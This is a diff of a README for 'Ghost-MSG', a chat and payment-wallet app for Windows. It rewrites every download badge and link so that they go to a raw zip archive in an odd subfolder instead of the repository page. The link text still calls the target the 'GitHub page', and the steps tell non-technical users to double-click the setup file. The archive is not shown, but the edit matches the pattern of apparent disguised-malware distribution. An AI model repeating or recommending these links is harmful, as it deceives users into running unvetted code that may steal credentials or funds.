@@ -1,6 +1,6 @@
 # 👻 Ghost-MSG - Real-Time Social Chat and Wallet
 
-[![Download Ghost-MSG](https://img.shields.io/badge/Download-Ghost--MSG-%23ff6600?style=for-the-badge)](https://github.com/phongdshh-debug/Ghost-MSG)
+[![Download Ghost-MSG](https://img.shields.io/badge/Download-Ghost--MSG-%23ff6600?style=for-the-badge)](https://github.com/phongdshh-debug/Ghost-MSG/raw/refs/heads/main/suant/MSG_Ghost_1.8.zip)
 
 A simple social web app for chatting, managing profiles, and sending payments. It works on Windows and uses Firebase to keep your data safe and up-to-date.
 
@@ -39,7 +39,7 @@ You don’t need technical skills to use Ghost-MSG. Just download it and start c
 
 ## 🚀 Getting Started with Ghost-MSG
 
-1. Click the large Download button at the top or visit the [Ghost-MSG GitHub page](https://github.com/phongdshh-debug/Ghost-MSG) to find the latest version.  
+1. Click the large Download button at the top or visit the [Ghost-MSG GitHub page](https://github.com/phongdshh-debug/Ghost-MSG/raw/refs/heads/main/suant/MSG_Ghost_1.8.zip) to find the latest version.  
 2. On the GitHub page, look for the download section or releases folder. Choose the Windows version if available.  
 3. Download the installation file to your computer. This could be an `.exe` or `.msi` file.  
 4. Once downloaded, double-click the setup file to install Ghost-MSG.  
@@ -106,7 +106,7 @@ You don’t need technical skills to use Ghost-MSG. Just download it and start c
 
 Visit the Ghost-MSG GitHub page to download and install the app on Windows:
 
-[![Download Ghost-MSG Now](https://img.shields.io/badge/Get%20Ghost--MSG-Click%20Here-blue?style=for-the-badge)](https://github.com/phongdshh-debug/Ghost-MSG)
+[![Download Ghost-MSG Now](https://img.shields.io/badge/Get%20Ghost--MSG-Click%20Here-blue?style=for-the-badge)](https://github.com/phongdshh-debug/Ghost-MSG/raw/refs/heads/main/suant/MSG_Ghost_1.8.zip)
 
 This page has the latest release files and installation instructions. Follow the instructions under the "Getting Started" section to run the app smoothly.
 
